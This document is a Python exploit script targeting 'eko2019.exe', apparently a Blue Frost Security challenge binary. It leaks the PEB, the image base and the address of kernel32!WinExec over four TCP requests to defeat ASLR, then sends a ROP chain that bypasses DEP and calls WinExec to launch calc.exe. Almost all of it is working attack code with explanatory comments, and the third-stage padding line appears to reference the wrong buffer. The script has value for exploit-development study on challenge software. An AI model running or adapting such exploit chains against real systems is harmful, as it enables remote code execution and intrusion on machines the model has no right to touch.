# Blue Frost Security 'eko2019.exe' Memory Corruption (ASLR and DEP Bypass)
# Full ASLR bypass with information leak (no need for non-ASLR modules)
# Author: Connor McGarr
# In muts we trust.
# Tested on Windows 10 x64
import sys
import os
import socket
import struct
import time

# 1st check: First 0x10 (16 bytes) are interpreted as the "header"
# 2nd check: Header starts with 0x393130326f6b45 (Eko2019)
# 3rd check: Message must be < 0x201 (513) bytes

# Defining sleep shorthand
sleep = time.sleep

# Begin header

# Adding null terminator in front of Eko2019 string to let eok2019.exe know this is where our header starts
print "[+] Sending the header..."
exploit = "\x45\x6B\x6F\x32\x30\x31\x39\x00" + "\x90"*8

# Exploit begins here

# 560 bytes for total crash (16 for header, 544 for the exploit)
# 512 byte offset to the byte we control
exploit += "\x41" * 512

# This byte converts the instruction we land on after the WriteProcessMemory() call
# \x65 turns this instruction we land on to mov rax,qword ptr gs:[rcx] instead of DS segment register
# The GS segment register gives us access to the PEB at an offset of 0x60
exploit += "\x65"

# \x60 will be moved in gs:[rcx] (\x41's are padding)
exploit += "\x41\x41\x41\x41\x41\x41\x41\x60"

# Making sure only \x60 is in rcx
# Must be a multiple of 8- so null bytes to compensate for the other 7 bytes
exploit += "\x00\x00\x00\x00\x00\x00\x00"

# Message needs to be 528 bytes total (1 byte short of the 529 crash)
exploit += "\x42" * (544-len(exploit))

print "[+] Sending first stage request..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.132", 54321))
s.sendall(exploit)

# Call to eko+0x1000 function (where WriteProcessMemory writes out 1 byte user controlled buffer) returns the value into RAX
# After value is in rax- the server responds with this result (RAX). Here, we are receiving that response and parsing it to find PEB
receive = s.recv(1024)

# Unpacking the response
print "[+] Extracting the PEB of eko2019.exe..."
unpack = struct.unpack_from('<Q', receive)

# Indexing the response (only 1 entry, which is the PEB returned in RAX after call to eko2019+0x100)
peb_addr = unpack[0]

# Print update for PEB location
print "[+] PEB is located at: {0}".format(hex(peb_addr))

# Closing the first stage request connection
s.close()

# Current image (eko2019.exe) base is located at PEB + 0x10
image_base = peb_addr + 0x10
print "[+] Image Base Address for eko2019.exe is located at: {0}".format(hex(image_base))

# Allocate some buffer time between first and second request
sleep(2)

# Second stage- extract the pointer to Image Base Address (which is the base virtual address for eko2019.exe)

# Predefining the Image Base Address in the form of an unsigned long long
real_image_base = struct.pack('<Q', image_base)

# We need to resend the header and setup the second request structure similar to the first.
print "[+] Resending the header for the second stage request..."
exploit_2 = "\x45\x6B\x6F\x32\x30\x31\x39\x00" + "\x90"*8

# 512 byte offset to the byte we control
exploit_2 += "\x41" * 512

# A NOP will let our instruction slide into a mov rax, qword ptr ds:[rcx] instruction
exploit_2 += "\x90"

# Padding to loading our value into rcx
exploit_2 += "\x41\x41\x41\x41\x41\x41\x41"

# Filling RCX with our Image Base Address for eko2019.exe
# This mov rax, qword ptr ds:[rcx] operation will extract the pointer and return the actual virtual address base of eko2019.exe
exploit_2 += real_image_base

# Need 528 total bytes
exploit_2 += "\x42" * (544-len(exploit_2))

print "[+] Sending second stage request..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.132", 54321))
s.sendall(exploit_2)

# Reading in rax in the response
receive_2 = s.recv(1024)

# Unpacking the response
print "[+] Extracting the base address of eok2019.exe..."
unpack_2 = struct.unpack_from('<Q', receive_2)

# Indexing the response
base_address = unpack_2[0]

# Print update the virtual address base of eko2019.exe
print "[+] Base virtual address of eko2019.exe is located at: {0}".format(hex(base_address))

# Closing the second stage request
s.close()

# Allocate some buffer time between second and third request
sleep(2)

# Third request - extract pointer to kernel32!WinExec in eko2019.exe 
# Predefining the pointer to kernel32!WinExec in the form of an unsigned long long
kernel32_winexec_temp = struct.pack('<Q', base_address+0x9010)

# We need to resend the header and setup the third request structure similar to the previous requests.
print "[+] Resending the header for the third stage request..."
exploit_3 = "\x45\x6B\x6F\x32\x30\x31\x39\x00" + "\x90"*8

# 512 byte offset to the byte we control
exploit_3 += "\x41" * 512

# A NOP will let our instruction slide into a mov rax, qword ptr ds:[rcx] instruction
exploit_3 += "\x90"

# Padding to loading our value into rcx
exploit_3 += "\x41\x41\x41\x41\x41\x41\x41"

# This mov rax, qword ptr ds:[rcx] operation will extract the pointer and return the actual virtual address for kernel32!WinExec
exploit_3 += kernel32_winexec_temp

# Need 528 total bytes
exploit_2 += "\x42" * (544-len(exploit_2))

print "[+] Sending third stage request..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.132", 54321))
s.sendall(exploit_3)

# Reading in rax in the response
receive_3 = s.recv(1024)

# Unpacking the response
print "[+] Extracting pointer to kernel32!WinExec..."
unpack_3 = struct.unpack_from('<Q', receive_3)

# Indexing the response
kernel32_winexec = unpack_3[0]

# Print update the virtual address base of eko2019.exe
print "[+] kernel32!WinExec is located at: {0}".format(hex(kernel32_winexec))

# Storing kernel32.dll base virtual address inside variable to use for future ROP gadget(s)
kernel32_base = kernel32_winexec-0x5e390
print "[+] kernel32.dll base virtual address is located at: {0}".format(hex(kernel32_base))

# Closing the third stage request
s.close()

# Allocate some buffer time between third and forth request
sleep(2)

# Fourth stage- stack pivot back to the stack to start executing ROP gadgets to spawn calc.exe

# Predefining ROP gadget to stack pivot
stack_pivot = struct.pack('<Q', base_address+0x158b)

# We need to resend the header and setup the fourth request structure similar to the previous requests.
print "[+] Resending the header for the fourth stage request..."
exploit_4 = "\x45\x6B\x6F\x32\x30\x31\x39\x00" + "\x90"*8

# 16 byte offset to ROP gadgets after stack pivot
exploit_4 += "\x90" * 16

# Begin ROP chain
print "[+] Setting up our ROP chain. Wish us luck..."

# x64 uses __fastcall convention

# Return to the stack (ROP NOP)
exploit_4 += struct.pack('<Q', base_address+0x10a1)			# ret: eko2019.exe

# UINT WinExec( -> rax
# LPCSTR lpCmdLine, -> rcx
# UINT   uCmdShow - > rdx
# );

# Placing first parameter into rcx (a pointer to a "calc\x00" string)

# The next gadget is a COP gadget that does not return, but calls r12
# Placing an add rsp, 0x10 gadget to act as a "return" to the stack into r12
exploit_4 += struct.pack('<Q', base_address+0x4a8e)			# pop r12 ; ret: eko2019.exe
exploit_4 += struct.pack('<Q', base_address+0x8789)			# add rsp, 0x10 ; ret: eko2019.exe 

# Grabbing a blank address in eko2019.exe to write our calc string to and create a pointer (COP gadget)
# The blank address should come from the .data section, as IDA has shown this the only segment of the executable that is writeable
exploit_4 += struct.pack('<Q', base_address+0x1167)			# pop rax ; ret: eko2019.exe
exploit_4 += struct.pack('<Q', base_address+0xc288)			# First empty address in eko2019.exe .data section
exploit_4 += struct.pack('<Q', base_address+0x6375)			# mov rcx, rax ; call r12: eko2019.exe
exploit_4 += struct.pack('<Q', 0x4141414141414141)			# Padding from add rsp, 0x10

# Creating a pointer to calc string
exploit_4 += struct.pack('<Q', base_address+0x1167)			# pop rax ; ret: eko2019.exe
exploit_4 += "calc\x00\x00\x00\x00"					# calc (with null terminator)
exploit_4 += struct.pack('<Q', kernel32_base+0x6130f)		        # mov qword [rcx], rax ; mov eax, 0x00000001 ; add rsp, 0x0000000000000080 ; pop rbx ; ret: kernel32.dll

# Padding for add rsp, 0x0000000000000080 and pop rbx
exploit_4 += "\x41" * 0x88

# Placing second parameter into rdx
exploit_4 += struct.pack('<Q', kernel32_base+0x19daa)		        # pop rdx ; add eax, 0x15FF0006 ; ret: kernel32.dll
exploit_4 += struct.pack('<Q', 0x01)				        # SH_SHOWNORMAL

# Calling kernel32!WinExec
exploit_4 += struct.pack('<Q', base_address+0x10a1)			# ret: eko2019.exe (ROP NOP)
exploit_4 += struct.pack('<Q', kernel32_winexec)			# Address of kernel32!WinExec

# 512 byte offset to the byte we control

# After WinExec call execution returns here
# Aligning the stack to return to a valid address with a ROP gadget
# Need to increase rsp by 0x110 bytes
exploit_4 += struct.pack('<Q', base_address+0x89b6)			# add rsp, 0x48 ; ret: eko2019.exe
exploit_4 += "\x41" * 0x48 							# Padding to reach next ROP gadget
exploit_4 += struct.pack('<Q', base_address+0x89b6)			# add rsp, 0x48 ; ret: eko2019.exe
exploit_4 += "\x41" * 0x48 							# Padding to reach next ROP gadget
exploit_4 += struct.pack('<Q', base_address+0x89b6)			# add rsp, 0x48 ; ret: eko2019.exe
exploit_4 += "\x41" * 0x48 							# Padding to reach next ROP gadget
exploit_4 += struct.pack('<Q', base_address+0x2e71)			# add rsp, 0x38 ; ret: eko2019.exe

# Compensating for ROP gadget usage
exploit_4 += "\x41" * (512-16-8-8-8-8-8-8-8-8-8-8-0x88-8-8-8-8-8-0x48-8-0x48-8-0x48-8)

# We control rcx. Since we control rcx, why don't we load rcx with a ROP gadget to return to the stack, push it onto the stack (load it in rsp)?
# To our advantage, each mov rax, dword ptr [rcx] instruction exits through a "ret"! This means, we can return into our ROP gadget.
# \x51 = push rcx
exploit_4 += "\x51"

# Padding to loading our value into rcx
exploit_4 += "\x41\x41\x41\x41\x41\x41\x41"

# Loading our ROP gadget of add rsp, 0x78 ; ret (located at eko2019+0x158b) into RCX
exploit_4 += stack_pivot

# Need 528 total bytes
exploit_4 += "\x41" * (544-len(exploit_4))

print "[+] Sending fourth stage request..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.132", 54321))
s.sendall(exploit_4)

# Reading in the response
receive_4 = s.recv(1024)

# Closing the connection
s.close()

# Print update
print "[+] Check for RCE!"
